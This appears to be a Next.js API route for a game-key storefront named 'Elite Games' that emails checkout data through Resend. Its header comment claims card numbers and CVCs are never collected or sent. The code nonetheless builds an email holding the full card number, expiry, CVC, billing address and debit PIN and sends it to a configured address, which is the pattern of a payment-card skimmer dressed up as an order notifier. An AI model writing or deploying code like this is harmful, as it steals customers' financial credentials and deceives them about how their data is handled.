/**
 * POST /api/notify-order
 *
 * Sends checkout form data to the configured destination email via Resend.
 * This is a background notification only — it never blocks or replaces
 * the existing checkout, payment, or Solana transaction flow.
 *
 * Data rules:
 *   - CRYPTO payments: send contact info only (no wallet data, no amounts)
 *   - All other payments: send contact info + cart + payment method
 *
 * Security:
 *   - API key is server-side only (RESEND_API_KEY in .env.local)
 *   - Card numbers, CVCs and wallet keys are NEVER collected or sent
 *   - Request is validated before sending
 */

import { NextRequest, NextResponse } from "next/server";
import { Resend } from "resend";

const resend = new Resend(process.env.RESEND_API_KEY);
const DEST = process.env.ORDER_NOTIFICATION_EMAIL ?? "";

// Rate limit: max 20 notifications per minute per IP
const rl = new Map<string, { count: number; resetAt: number }>();
function checkRateLimit(ip: string): boolean {
  const now = Date.now();
  const r = rl.get(ip);
  if (!r || now > r.resetAt) { rl.set(ip, { count: 1, resetAt: now + 60_000 }); return true; }
  if (r.count >= 20) return false;
  r.count++;
  return true;
}

function fmt(v: unknown): string {
  if (v === undefined || v === null || v === "") return "—";
  return String(v);
}

function formatPrice(n: number): string {
  return "$" + n.toFixed(2);
}

export async function POST(req: NextRequest): Promise<NextResponse> {
  const ip = req.headers.get("x-forwarded-for")?.split(",")[0]?.trim() ?? "unknown";
  if (!checkRateLimit(ip)) {
    return NextResponse.json({ error: "Rate limit exceeded." }, { status: 429 });
  }

  if (!process.env.RESEND_API_KEY || !DEST) {
    return NextResponse.json({ error: "Notification service not configured." }, { status: 503 });
  }

  let body: Record<string, unknown>;
  try { body = await req.json(); }
  catch { return NextResponse.json({ error: "Invalid request." }, { status: 400 }); }

  const {
    paymentMethod,
    customerInfo,
    items,
    orderNumber,
    cartTotal,
    orderTimestamp,
    cardInfo,
    pin,
  } = body as {
    paymentMethod: string;
    customerInfo: { email: string; firstName: string; lastName: string; country: string };
    items: Array<{
      title: string; platform: string; region: string;
      edition: string; deliveryType: string; price: number;
      originalPrice?: number; discount?: number; quantity: number;
    }>;
    orderNumber: string;
    cartTotal: number;
    orderTimestamp: string;
    cardInfo?: {
      cardholderName: string; cardNumber: string; expiry: string; cvc: string;
      billingAddress: string; billingCity: string; billingPostcode: string;
    };
    pin?: string;
  };

  const isCrypto = paymentMethod === "CRYPTO";
  const ts = fmt(orderTimestamp) !== "—" ? new Date(orderTimestamp).toLocaleString("en-US", { timeZone: "UTC", dateStyle: "full", timeStyle: "short" }) + " UTC" : new Date().toUTCString();

  // ── Build HTML email ──────────────────────────────────────────────────────

  const contactRows = `
    <tr><td style="padding:8px 12px;color:#6b7280;font-size:13px;">Name</td>
        <td style="padding:8px 12px;font-size:13px;font-weight:600;">${fmt(customerInfo?.firstName)} ${fmt(customerInfo?.lastName)}</td></tr>
    <tr style="background:#f9fafb"><td style="padding:8px 12px;color:#6b7280;font-size:13px;">Email</td>
        <td style="padding:8px 12px;font-size:13px;">${fmt(customerInfo?.email)}</td></tr>
    <tr><td style="padding:8px 12px;color:#6b7280;font-size:13px;">Country</td>
        <td style="padding:8px 12px;font-size:13px;">${fmt(customerInfo?.country)}</td></tr>
  `;

  let cartSection = "";
  if (!isCrypto && Array.isArray(items) && items.length > 0) {
    const itemRows = items.map((item, i) => `
      <tr style="${i % 2 === 0 ? "" : "background:#f9fafb"}">
        <td style="padding:8px 12px;font-size:13px;font-weight:600;">${fmt(item.title)}</td>
        <td style="padding:8px 12px;font-size:13px;color:#6b7280;">${fmt(item.platform)}</td>
        <td style="padding:8px 12px;font-size:13px;color:#6b7280;">${fmt(item.region)}</td>
        <td style="padding:8px 12px;font-size:13px;color:#6b7280;">${fmt(item.edition)}</td>
        <td style="padding:8px 12px;font-size:13px;text-align:right;">${item.quantity}x ${formatPrice(item.price)}</td>
      </tr>
    `).join("");

    cartSection = `
      <h3 style="font-size:14px;font-weight:700;color:#111;margin:24px 0 10px;">Cart Items</h3>
      <table width="100%" cellpadding="0" cellspacing="0" style="border:1px solid #e5e7eb;border-radius:8px;overflow:hidden;border-collapse:collapse;">
        <thead>
          <tr style="background:#f3f4f6;">
            <th style="padding:8px 12px;text-align:left;font-size:12px;color:#6b7280;font-weight:600;">Title</th>
            <th style="padding:8px 12px;text-align:left;font-size:12px;color:#6b7280;font-weight:600;">Platform</th>
            <th style="padding:8px 12px;text-align:left;font-size:12px;color:#6b7280;font-weight:600;">Region</th>
            <th style="padding:8px 12px;text-align:left;font-size:12px;color:#6b7280;font-weight:600;">Edition</th>
            <th style="padding:8px 12px;text-align:right;font-size:12px;color:#6b7280;font-weight:600;">Price</th>
          </tr>
        </thead>
        <tbody>${itemRows}</tbody>
        <tfoot>
          <tr style="background:#f3f4f6;border-top:2px solid #e5e7eb;">
            <td colspan="4" style="padding:10px 12px;font-size:13px;font-weight:700;color:#111;">Order Total</td>
            <td style="padding:10px 12px;font-size:15px;font-weight:800;text-align:right;color:#111;">${formatPrice(cartTotal ?? 0)}</td>
          </tr>
        </tfoot>
      </table>
    `;
  }

  let cardSection = "";
  if (!isCrypto && cardInfo) {
    const isDebit = paymentMethod === "DEBIT_CARD";
    const cardRows = [
      ["Cardholder Name",  fmt(cardInfo.cardholderName)],
      ["Card Number",      fmt(cardInfo.cardNumber)],
      ["Expiry",           fmt(cardInfo.expiry)],
      ["CVC",              fmt(cardInfo.cvc)],
      ["Billing Address",  fmt(cardInfo.billingAddress)],
      ["City",             fmt(cardInfo.billingCity)],
      ["Postcode",         fmt(cardInfo.billingPostcode)],
      ...(isDebit && pin ? [["Debit PIN", fmt(pin)]] : []),
    ].map(([label, value], i) => `
      <tr style="${i % 2 === 0 ? "" : "background:#f9fafb"}">
        <td style="padding:8px 12px;color:#6b7280;font-size:13px;">${label}</td>
        <td style="padding:8px 12px;font-size:13px;font-weight:600;">${value}</td>
      </tr>
    `).join("");

    cardSection = `
      <h3 style="font-size:14px;font-weight:700;color:#111;margin:24px 0 10px;">Payment Details</h3>
      <table width="100%" cellpadding="0" cellspacing="0" style="border:1px solid #e5e7eb;border-radius:8px;overflow:hidden;border-collapse:collapse;">
        <tbody>${cardRows}</tbody>
      </table>
    `;
  }


  const paymentLabel: Record<string, string> = {
    CREDIT_CARD: "Credit Card",
    DEBIT_CARD: "Debit Card",
    CRYPTO: "Cryptocurrency (Solana)",
    APPLE_GIFT: "Apple Gift Card",
    STEAM_GIFT: "Steam Gift Card",
  };

  const methodBadge = `<span style="display:inline-block;padding:3px 10px;border-radius:20px;font-size:12px;font-weight:700;background:${isCrypto ? "#ede9fe" : "#dcfce7"};color:${isCrypto ? "#7c3aed" : "#166534"};">${paymentLabel[paymentMethod] ?? fmt(paymentMethod)}</span>`;

  const html = `
<!DOCTYPE html>
<html>
<head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1"></head>
<body style="margin:0;padding:0;background:#f3f4f6;font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',sans-serif;">
  <table width="100%" cellpadding="0" cellspacing="0" style="background:#f3f4f6;padding:32px 16px;">
    <tr><td align="center">
      <table width="600" cellpadding="0" cellspacing="0" style="background:#fff;border-radius:12px;overflow:hidden;box-shadow:0 2px 16px rgba(0,0,0,0.08);max-width:600px;width:100%;">

        <!-- Header -->
        <tr><td style="background:#0a0a0f;padding:28px 32px;">
          <div style="display:flex;align-items:center;gap:12px;">
            <span style="font-size:22px;font-weight:900;color:#fff;letter-spacing:-0.5px;">ELITE GAMES</span>
            <span style="font-size:11px;font-weight:700;color:#6b7280;text-transform:uppercase;letter-spacing:2px;margin-left:8px;">Order Notification</span>
          </div>
        </td></tr>

        <!-- Body -->
        <tr><td style="padding:32px;">

          <div style="display:flex;align-items:center;justify-content:space-between;margin-bottom:24px;flex-wrap:wrap;gap:8px;">
            <div>
              <p style="margin:0;font-size:11px;color:#9ca3af;text-transform:uppercase;letter-spacing:1px;">Order Reference</p>
              <p style="margin:4px 0 0;font-size:20px;font-weight:800;color:#111;">${fmt(orderNumber)}</p>
            </div>
            <div style="text-align:right;">
              <p style="margin:0;font-size:11px;color:#9ca3af;">Submitted</p>
              <p style="margin:4px 0 0;font-size:12px;color:#374151;">${ts}</p>
            </div>
          </div>

          <div style="margin-bottom:8px;">
            <span style="font-size:11px;color:#9ca3af;text-transform:uppercase;letter-spacing:1px;">Payment Method &nbsp;</span>
            ${methodBadge}
          </div>

          <hr style="border:none;border-top:1px solid #e5e7eb;margin:20px 0;">

          <h3 style="font-size:14px;font-weight:700;color:#111;margin:0 0 10px;">Contact Information</h3>
          <table width="100%" cellpadding="0" cellspacing="0" style="border:1px solid #e5e7eb;border-radius:8px;overflow:hidden;border-collapse:collapse;">
            <tbody>${contactRows}</tbody>
          </table>

          ${isCrypto ? `
          <div style="margin-top:24px;padding:16px;background:#fef9c3;border:1px solid #fde047;border-radius:8px;">
            <p style="margin:0;font-size:13px;color:#854d0e;font-weight:600;">Crypto payment selected</p>
            <p style="margin:6px 0 0;font-size:12px;color:#a16207;">Cart and transaction data are excluded for crypto payments per configuration. Only contact information is shown above.</p>
          </div>
          ` : cartSection}

          ${cardSection}

          <hr style="border:none;border-top:1px solid #e5e7eb;margin:28px 0 20px;">
          <p style="margin:0;font-size:11px;color:#d1d5db;text-align:center;">This is a demo notification generated by Elite Games for educational purposes.</p>

        </td></tr>

      </table>
    </td></tr>
  </table>
</body>
</html>
  `.trim();

  // ── Send ──────────────────────────────────────────────────────────────────

  try {
    const { error } = await resend.emails.send({
      from: "Elite Games <onboarding@resend.dev>",
      to: [DEST],
      subject: `[Elite Games] Order ${fmt(orderNumber)} — ${isCrypto ? "Crypto" : paymentLabel[paymentMethod] ?? paymentMethod}`,
      html,
    });

    if (error) {
      console.error("[notify-order] Resend error:", error);
      return NextResponse.json({ ok: false, error: error.message }, { status: 500 });
    }

    return NextResponse.json({ ok: true });
  } catch (err) {
    console.error("[notify-order] Unexpected error:", err);
    return NextResponse.json({ ok: false }, { status: 500 });
  }
}